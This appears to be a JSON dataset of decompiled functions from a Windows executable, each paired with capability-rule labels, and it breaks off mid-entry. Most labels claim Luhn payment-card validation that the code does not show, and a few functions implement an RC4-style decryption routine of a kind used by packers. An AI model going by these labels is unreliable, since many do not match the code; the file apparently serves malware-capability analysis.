    "004083e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004083e0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*(param_1 + 0x13c) == 0) {\n        iVar3 = *(param_1 + 0x5c);\n        iVar1 = fcn.00410e48();\n        *(param_1 + 0x58) = iVar1 + iVar3;\n    }\n    else {\n        iVar3 = *(param_1 + 0x60);\n        iVar1 = fcn.00410e48();\n        *(param_1 + 0x54) = iVar1 + iVar3;\n    }\n    fcn.00407ef0();\n    uVar2 = (*_sym.imp.USER32.dll_GetDC)(*(param_1 + 0x1c));\n    iVar3 = fcn.0043374e(uVar2);\n    if (*(param_1 + 0x13c) != 0) {\n        fcn.00407100();\n        (*_sym.imp.USER32.dll_ReleaseDC)(*(param_1 + 0x1c), *(iVar3 + 4));\n        return;\n    }\n    fcn.004077c0(iVar3);\n    (*_sym.imp.USER32.dll_ReleaseDC)(*(param_1 + 0x1c), *(iVar3 + 4));\n    return;\n}\n",
        "token_count": 309
    },
    "00409170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409170(int32_t param_1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint uVar8;\n    char *unaff_EBP;\n    char *pcVar9;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x44b278;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    if (*(param_1 + 0xf4) == 0) {\n        fcn.00444bf8();\n        pcVar2 = _sym.imp.USER32.dll_LoadCursorA;\n        iVar3 = (*_sym.imp.USER32.dll_LoadCursorA)(0, 0x7f89);\n        *(param_1 + 0xf4) = iVar3;\n        if (iVar3 != 0) goto code_r0x00409296;\n        piVar4 = fcn.004290ee();\n        iVar3 = (**(*piVar4 + 0xc))();\n        pcVar9 = iVar3 + 0x10;\n        uStack4 = 0;\n        if ((*(iVar3 + 8) - 0x104U | 1U - *(iVar3 + 0xc)) < 0) {\n            pcVar9 = unaff_EBP;\n            fcn.004018b0(0x104);\n        }\n        iVar3 = 0x104;\n        (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(pcVar9);\n        if (pcVar9 == NULL) {\n            iVar5 = 0;\n        }\n        else {\n            pcVar6 = pcVar9;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            iVar5 = pcVar6 - (pcVar9 + 1);\n            if (iVar5 < 0) goto code_r0x004092a6;\n        }\n        if (*(pcVar9 + -8) < iVar5) {\ncode_r0x004092a6:\n            fcn.00401100(0x80070057);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        *(pcVar9 + -0xc) = iVar5;\n        pcVar9[iVar5] = '\\0';\n        fcn.00405e70(\"\\\\winhlp32.exe\", 0xd);\n        iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar3);\n        if (iVar5 != 0) {\n            iVar7 = (*pcVar2)(iVar5, 0x6a);\n            if (iVar7 != 0) {\n                uVar8 = (*_sym.imp.USER32.dll_CopyIcon)(iVar7);\n                *(param_1 + 0xf4) = uVar8;\n            }\n            (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar5);\n        }\n        uStack4 = 0xffffffff;\n        piVar4 = iVar3 + -4;\n        LOCK();\n        iVar5 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n        if (iVar5 == 1 || iVar5 + -1 < 0) {\n            (**(**(iVar3 + -0x10) + 4))(iVar3 + -0x10);\n        }\n    }\ncode_r0x00409296:\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 821
    },
    "0044524e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0044524e(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWinApp.0;\n    piVar1 = extraout_ECX[0x15];\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))(1);\n    }\n    if (extraout_ECX[0x21] != NULL) {\n        (**(*extraout_ECX[0x21] + 0x18))(1);\n    }\n    iVar3 = fcn.00444bf8();\n    if (*(iVar3 + 0x14) == '\\0') {\n        if (*0x466d44 != NULL) {\n            (**(**0x466d44 + 4))(1);\n            *0x466d44 = NULL;\n        }\n        if (*0x466d40 != NULL) {\n            (**(**0x466d40 + 4))(1);\n            *0x466d40 = NULL;\n        }\n    }\n    if (extraout_ECX[0x1b] != NULL) {\n        fcn.00434c84(extraout_ECX[0x1b]);\n    }\n    if (extraout_ECX[0x1c] != NULL) {\n        fcn.00434c84(extraout_ECX[0x1c]);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalDeleteAtom;\n    if (*(extraout_ECX + 0x23) != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(*(extraout_ECX + 0x23));\n    }\n    if (*(extraout_ECX + 0x8e) != 0) {\n        (*pcVar2)(*(extraout_ECX + 0x8e));\n    }\n    if (extraout_ECX[0x22] != NULL) {\n        (**(*extraout_ECX[0x22] + 4))(1);\n    }\n    iVar3 = fcn.00444bf8();\n    if (*(iVar3 + 0x10) == extraout_ECX[0x13]) {\n        *(iVar3 + 0x10) = 0;\n    }\n    if (*(iVar3 + 4) == extraout_ECX) {\n        *(iVar3 + 4) = 0;\n    }\n    fcn.00411031(extraout_ECX[0x13]);\n    fcn.00411031(extraout_ECX[0x14]);\n    fcn.00411031(extraout_ECX[0x17]);\n    fcn.00411031(extraout_ECX[0x18]);\n    fcn.00411031(extraout_ECX[0x19]);\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[10] = NULL;\n    fcn.0044aa71();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 787
    },
    "00409620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.00409620(int32_t param_1, uint8_t *param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    \n    iVar3 = param_1;\n    iVar7 = 0;\n    do {\n        pcVar1 = iVar7 + param_1;\n        iVar7 = iVar7 + 1;\n    } while (*pcVar1 != '\\0');\n    iVar6 = 0;\n    iVar4 = 0;\n    do {\n        param_2[iVar4] = iVar4;\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x13440);\n    param_1 = 0;\n    puVar5 = param_2;\n    do {\n        iVar4 = (*puVar5 + *(param_1 % iVar7 + iVar3) + iVar6) % 0x13440;\n        uVar2 = *puVar5;\n        *puVar5 = param_2[iVar4];\n        param_2[iVar4] = uVar2;\n        iVar4 = (puVar5[1] + *((puVar5 + (1 - param_2)) % iVar7 + iVar3) + iVar4) % 0x13440;\n        uVar2 = puVar5[1];\n        puVar5[1] = param_2[iVar4];\n        param_2[iVar4] = uVar2;\n        iVar4 = (puVar5[2] + *((puVar5 + (2 - param_2)) % iVar7 + iVar3) + iVar4) % 0x13440;\n        uVar2 = puVar5[2];\n        puVar5[2] = param_2[iVar4];\n        param_2[iVar4] = uVar2;\n        iVar4 = (puVar5[3] + *((puVar5 + (3 - param_2)) % iVar7 + iVar3) + iVar4) % 0x13440;\n        uVar2 = puVar5[3];\n        puVar5[3] = param_2[iVar4];\n        param_2[iVar4] = uVar2;\n        iVar4 = (puVar5[4] + *((puVar5 + (4 - param_2)) % iVar7 + iVar3) + iVar4) % 0x13440;\n        uVar2 = puVar5[4];\n        puVar5[4] = param_2[iVar4];\n        param_2[iVar4] = uVar2;\n        iVar6 = (puVar5[5] + *((puVar5 + (5 - param_2)) % iVar7 + iVar3) + iVar4) % 0x13440;\n        uVar2 = puVar5[5];\n        puVar5[5] = param_2[iVar6];\n        param_2[iVar6] = uVar2;\n        param_1 = param_1 + 6;\n        puVar5 = puVar5 + 6;\n    } while (param_1 < 0x13440);\n    return 0;\n}\n",
        "token_count": 703
    },
    "004097c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint fcn.004097c0(int32_t param_1, int32_t param_2, uint8_t *param_3, uint8_t *param_4)\n\n{\n    uchar uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iStack12;\n    \n    iStack12 = param_4;\n    iVar5 = 0;\n    iVar4 = 0;\n    if (param_4 != NULL) {\n        param_4 = param_3;\n        do {\n            iVar5 = (iVar5 + 1) % 0x13440;\n            iVar4 = (*(iVar5 + param_1) + iVar4) % 0x13440;\n            uVar1 = *(iVar5 + param_1);\n            *(iVar5 + param_1) = *(param_1 + iVar4);\n            *(param_1 + iVar4) = uVar1;\n            uVar2 = param_4[param_2 - param_3];\n            uVar3 = *((*(iVar5 + param_1) + *(param_1 + iVar4)) % 0x13440 + param_1);\n            (*_sym.imp.USER32.dll_SendMessageA)(0, 0x84, 0x1c8, 0);\n            *param_4 = (~uVar3 | ~uVar2) & (uVar3 | uVar2);\n            param_4 = param_4 + 1;\n            iStack12 = iStack12 + -1;\n        } while (iStack12 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 364
    },
    "004098e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuchar * fcn.004098e0(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uint in_stack_00013444;\n    int32_t in_stack_00013448;\n    int32_t in_stack_0001344c;\n    \n    fcn.004112a0();\n    puVar1 = fcn.0042eaeb(in_stack_0001344c + 1);\n    puVar1[in_stack_0001344c] = 0;\n    if (in_stack_0001344c != 0) {\n        puVar2 = puVar1;\n        iVar3 = in_stack_0001344c;\n        do {\n            *puVar2 = puVar2[in_stack_00013448 - puVar1];\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.00409620(in_stack_00013444, *0x10);\n    fcn.004097c0(*0x10, in_stack_00013448, puVar1, in_stack_0001344c);\n    return puVar1;\n}\n",
        "token_count": 266
    },
    "00409990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00409990(void)\n\n{\n    uint *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    int32_t in_FS_OFFSET;\n    \n    puVar4 = *(*(*(in_FS_OFFSET + *0x4630d0) + *0x4630d4) + *0x4630d8);\n    do {\n        uVar6 = 0;\n        iVar3 = *0x4630e4;\n        puVar5 = *(puVar4 + *0x4630dc);\n        do {\n            uVar2 = *puVar5;\n            if ('`' < uVar2) {\n                uVar2 = uVar2 - 0x20;\n            }\n            uVar6 = (uVar6 >> 0xd | uVar6 << 0x13) + uVar2;\n            iVar3 = iVar3 + -1;\n            puVar5 = puVar5 + 1;\n        } while (iVar3 != 0);\n        puVar1 = puVar4 + 4;\n        puVar4 = *puVar4;\n    } while (uVar6 != *0x4630e0);\n    return *puVar1;\n}\n",
        "token_count": 289
    },
    "00409c30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00409c30(uint *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x44b2b8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    uVar3 = 0x66;\n    fcn.004284fa(0x66, param_2);\n    uStack12 = 0;\n    *param_1 = 0x44f548;\n    fcn.00444bf8();\n    iVar1 = fcn.00444bf8();\n    uVar2 = (*_sym.imp.USER32.dll_LoadIconA)(*(iVar1 + 0xc), 0x80);\n    param_1[0x1c] = uVar2;\n    *in_FS_OFFSET = uVar3;\n    return param_1;\n}\n",
        "token_count": 243
    },
    "0040a47c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a47c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_2);\n    fcn.00411970(unaff_retaddr, param_1, iVar1 * 2 + 2);\n    return;\n}\n",
        "token_count": 85
    },
    "0040ab3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.0040ab3a(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *extraout_ECX;\n    \n    piVar1 = *param_1;\n    if (piVar1 == NULL) {\n        piVar1 = fcn.00422e61();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *piVar1;\n    return piVar1 + 2;\n}\n",
        "token_count": 108
    },
    "0040adef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040adef(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t pvParam;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    iVar2 = fcn.0040aba0();\n    if (iVar2 == 0) {\n        if ((((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) &&\n           (iVar2 = (*_sym.imp.USER32.dll_SystemParametersInfoA)(0x30, 0, &pvParam, 0),  iVar2 != 0)) {\n            arg_ch[1] = 0;\n            arg_ch[2] = 0;\n            pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n            uVar4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n            arg_ch[3] = uVar4;\n            uVar4 = (*pcVar1)(1);\n            arg_ch[5] = pvParam;\n            arg_ch[6] = uStack16;\n            arg_ch[7] = uStack12;\n            arg_ch[8] = uStack8;\n            uVar3 = 1;\n            arg_ch[4] = uVar4;\n            arg_ch[9] = 1;\n            if (0x47 < *arg_ch) {\n                (*_sym.imp.KERNEL32.dll_lstrcpynA)(arg_ch + 10, \"DISPLAY\", 0x20);\n            }\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = (**0x466bc8)(arg_8h, arg_ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 421
    },
    "0040b90b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040b90b(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    iVar1 = *param_1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.00422e61();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *(iVar1 + 4);\n    return iVar1 + 8;\n}\n",
        "token_count": 104
    },
    "0040b930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0040b930(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00412110(param_1, param_2, 0x10);\n    return iVar1 == 0;\n}\n",
        "token_count": 60
    },
    "0040bd84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040bd84(uint param_1)\n\n{\n    fcn.00411850(param_1, 0, 0x18);\n    return param_1;\n}\n",
        "token_count": 43
    },
    "0040c297": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040c297(void)\n\n{\n    fcn.00403ad0(0x4630b4, 0x40c193, _sym.imp.KERNEL32.dll_CompareStringW);\n    // WARNING: Could not recover jumptable at 0x0040c2b3. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x4630b4)();\n    return;\n}\n",
        "token_count": 96
    },
    "0040c4ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040c4ed(void)\n\n{\n    fcn.00403ad0(0x4630b8, 0x40c431, _sym.imp.KERNEL32.dll_GetStringTypeExW);\n    // WARNING: Could not recover jumptable at 0x0040c509. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x4630b8)();\n    return;\n}\n",
        "token_count": 96
    },
    "0040c9c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c9c2(uint psa, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayUnaccessData)(psa, &var_4h);\n    fcn.0040c68e(uVar1);\n    fcn.00411970(var_4h, arg_ch, arg_10h);\n    uVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElement)(psa);\n    fcn.0040c68e(uVar1);\n    return;\n}\n",
        "token_count": 145
    },
    "0040ccae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040ccae(uint param_1)\n\n{\n    fcn.00411850(param_1, 0, 0x10);\n    return;\n}\n",
        "token_count": 38
    },
    "0040ccc1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ccc1(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        do {\n            fcn.0040cc51();\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0040d0c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d0c4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint vtime;\n    uint var_ah;\n    ushort var_6h;\n    ushort var_4h;\n    \n    fcn.00411850(&vtime, 0, 0x10);\n    vtime._0_2_ = arg_8h;\n    vtime._2_2_ = arg_ch;\n    var_ah._0_2_ = arg_10h;\n    var_ah._2_2_ = arg_14h;\n    var_6h = arg_18h;\n    var_4h = arg_1ch;\n    iVar1 = (*_sym.imp.OLEAUT32.dll_VariantTimeToSystemTime)(&vtime);\n    *(in_ECX + 8) = iVar1 == 0;\n    return;\n}\n",
        "token_count": 240
    },
    "0040de16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0040de16(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.OLEAUT32.dll_VariantInit;\n    if (arg_8h_00 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (*_sym.imp.OLEAUT32.dll_VariantInit)(arg_8h_00);\n    }\n    fcn.0040db28(uVar2);\n    if (arg_8h_00 != 0) {\n        iVar3 = (*pcVar1)(arg_8h_00);\n        if (iVar3 != 0) {\n            iVar3 = (*pcVar1)(arg_8h_00);\n            fcn.00435340(arg_8h_00, iVar3 * 2);\n        }\n    }\n    (*_sym.imp.OLEAUT32.dll_SysStringLen)(arg_8h_00);\n    uVar2 = *(unaff_EBP + 8);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 375
    },
    "0040f961": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0040f961(uint *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00444bc2();\n    param_1[1] = iVar1;\n    param_1[2] = *(iVar1 + 0xf0);\n    *param_1 = *(iVar1 + 0xec);\n    *(iVar1 + 0xec) = param_2;\n    *(param_1[1] + 0xf0) = param_1;\n    return param_1;\n}\n",
        "token_count": 127
    },
    "0040fc09": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040fc09(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004134e4(param_1);\n    if (iVar1 != 0) {\n        return *(iVar1 + 0x14) + 0x76c;\n    }\n    return 0;\n}\n",
        "token_count": 78
    },
    "0041036d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041036d(int32_t *param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    param_1[2] = param_4 + param_2;\n    *param_1 = param_2;\n    param_1[1] = param_3;\n    param_1[3] = param_5 + param_3;\n    return;\n}\n",
        "token_count": 107
    },
    "004103ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.004103ec(uint *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00444bc2();\n    param_1[1] = iVar1;\n    param_1[2] = *(iVar1 + 0xe8);\n    *param_1 = *(iVar1 + 0xe4);\n    *(iVar1 + 0xe4) = param_2;\n    *(param_1[1] + 0xe8) = param_1;\n    return param_1;\n}\n",
        "token_count": 128
    },
    "004108ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004108ed(code *UNRECOVERED_JUMPTABLE)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = **in_FS_OFFSET;\n    // WARNING: Could not recover jumptable at 0x00410916. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 87
    },
    "00410ebd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410ebd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    var_14h = 0x49;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    var_1ch = fcn.00411cb0();\n    fcn.00414d7e(&var_20h, arg_ch, &arg_10h, arg_8h);\n    return;\n}\n",
        "token_count": 137
    },
    "00410ef1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410ef1(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uchar *var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    \n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    uVar1 = fcn.00415cc0(&var_20h, arg_ch, arg_10h);\n    if (arg_8h != NULL) {\n        var_1ch = var_1ch + -1;\n        if (var_1ch < 0) {\n            fcn.00415afa(0, &var_20h);\n        }\n        else {\n            *var_20h = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 219
    },
    "00410f48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410f48(uint arg_8h, uint arg_ch)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    var_18h = 0;\n    var_20h = 0;\n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    fcn.00415cc0(&var_20h, arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 118
    },
    "00411d75": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411d75(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uchar *var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    \n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    var_14h = 0x42;\n    var_1ch = 0x7fffffff;\n    uVar1 = fcn.004187e2(&var_20h, arg_ch, &arg_10h);\n    var_1ch = var_1ch + -1;\n    if (var_1ch < 0) {\n        fcn.00415afa(0, &var_20h);\n    }\n    else {\n        *var_20h = 0;\n        var_20h = var_20h + 1;\n    }\n    var_1ch = var_1ch + -1;\n    if (var_1ch < 0) {\n        fcn.00415afa(0, &var_20h);\n    }\n    else {\n        *var_20h = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 280
    },
    "00411de4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411de4(uint arg_8h, uint arg_ch)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    var_18h = 0;\n    var_20h = 0;\n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    fcn.004187e2(&var_20h, arg_8h, &arg_ch);\n    return;\n}\n",
        "token_count": 119
    },
    "0041205e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041205e(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uchar *var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    \n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    uVar1 = fcn.00415cc0(&var_20h, arg_ch, &arg_10h);\n    if (arg_8h != NULL) {\n        var_1ch = var_1ch + -1;\n        if (var_1ch < 0) {\n            fcn.00415afa(0, &var_20h);\n        }\n        else {\n            *var_20h = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 220
    },
    "004120b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004120b6(uint arg_8h, uint arg_ch)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    var_18h = 0;\n    var_20h = 0;\n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    fcn.00415cc0(&var_20h, arg_8h, &arg_ch);\n    return;\n}\n",
        "token_count": 119
    },
    "004121c8": {
        "rules": [
